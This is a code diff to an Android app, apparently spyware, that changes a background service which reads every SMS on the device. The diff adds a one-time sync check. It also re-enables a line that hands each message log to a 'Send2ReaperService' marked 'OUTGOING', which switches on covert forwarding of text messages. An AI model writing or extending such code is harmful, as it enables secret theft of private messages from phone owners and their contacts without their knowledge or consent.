@@ -1,7 +1,10 @@
 package com.bigeye.crasher;
 
+import java.util.Calendar;
+
 import android.app.IntentService;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
 import android.text.format.DateFormat;
@@ -12,6 +15,9 @@ public class ReadSMSLogs extends IntentService{
 	private final String APP_TAG = getClass().getSimpleName();
 	private static final long SLEEP_TIME = 5 * 1000;
 
+	SharedPreferences sharedPrefs;
+	final String prefName = "Sync";
+	
 	public ReadSMSLogs() {
 		super("Read SMS Logs");
 		// TODO Auto-generated constructor stub
@@ -19,8 +25,30 @@ public class ReadSMSLogs extends IntentService{
 
 	@Override
 	protected void onHandleIntent(Intent intent) {
-		Log.i(APP_TAG,"About to start fetching all SMS logs: standby ");
-		GetSMSLogs();
+		
+		//check prefs whether logs have been synced
+		sharedPrefs = getSharedPreferences(prefName, MODE_PRIVATE);
+		boolean smsLogsSynced = sharedPrefs.getBoolean("smsLogsSynced", false);
+		String lastSyncDate = sharedPrefs.getString("LastSMSLogsSyncDate", "NULL");
+		
+		if(smsLogsSynced){
+			Log.i(APP_TAG,"SMS Logs had been synced. Date: "+lastSyncDate);
+			
+			Log.i(APP_TAG,"commiting suicide");
+			stopSelf();
+		}else{
+			Log.i(APP_TAG,"SMS Logs have NEVER been synced. Date: "+lastSyncDate);
+			
+			Log.i(APP_TAG,"About to start fetching all SMS logs: standby ");
+			GetSMSLogs();
+		}
+		
+		//save in prefs sync status & date
+		sharedPrefs = getSharedPreferences(prefName, MODE_PRIVATE);
+		SharedPreferences.Editor editor = sharedPrefs.edit();
+		editor.putBoolean("smsLogsSynced", true);
+		editor.putString("LastSMSLogsSyncDate",java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime()));
+		editor.commit();
 		
 		Log.i(APP_TAG,"finished reading all SMS logs: commiting suicide");
 		stopSelf();
@@ -82,7 +110,7 @@ public class ReadSMSLogs extends IntentService{
 				Intent SvcIntent = new Intent(getApplicationContext(), Send2ReaperService.class);
 				SvcIntent.putExtra("OPERATION", "OUTGOING");
 				SvcIntent.putExtra("MSG", SMSLogStr);
-//				startService(SvcIntent);
+				startService(SvcIntent);
 				
 			}
 			
